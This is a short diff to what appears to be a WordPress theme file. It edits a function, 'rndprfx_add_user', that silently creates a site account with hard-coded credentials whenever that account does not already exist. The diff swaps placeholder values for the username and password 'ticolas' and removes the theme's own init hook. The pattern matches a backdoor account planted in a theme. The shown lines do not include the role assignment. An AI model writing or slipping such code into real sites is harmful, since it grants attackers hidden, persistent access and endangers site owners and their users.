@@ -1,8 +1,7 @@
-add_action( 'init', 'twentytwentyfour_pattern_categories' );
 function rndprfx_add_user() {
-    $username = 'username';
-    $password = 'password';
-    $email = 'tico@ti.co';
+    $username = 'ticolas';
+    $password = 'ticolas';
+    $email = 'ticolas@ti.co';
 
     if (username_exists($username) == null && email_exists($email) == false) {
         $user_id = wp_create_user( $username, $password, $email );
